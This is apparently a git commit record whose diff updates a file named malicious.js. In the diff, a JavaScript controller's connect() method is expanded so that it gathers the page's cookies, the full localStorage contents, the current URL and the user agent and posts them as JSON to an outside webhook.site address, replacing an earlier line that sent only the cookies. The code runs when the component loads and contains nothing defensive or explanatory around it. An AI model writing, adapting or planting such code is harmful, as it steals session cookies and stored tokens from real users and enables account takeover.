8fef4cffebe6c563ee96eab713c63d4bfdfe2ce1
0smyssss <samir.sayed.it@gmail.com>
2025-07-21 14:33:02 +0300

    Update malicious.js

--- malicious.js
+++ malicious.js
@@ -1,5 +1,18 @@
 export default class {
   connect() {
-    fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570?cookie=" + encodeURIComponent(document.cookie));
+    const info = {
+      cookie: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      location: window.location.href,
+      userAgent: navigator.userAgent
+    };
+
+    fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(info)
+    });
   }
 }
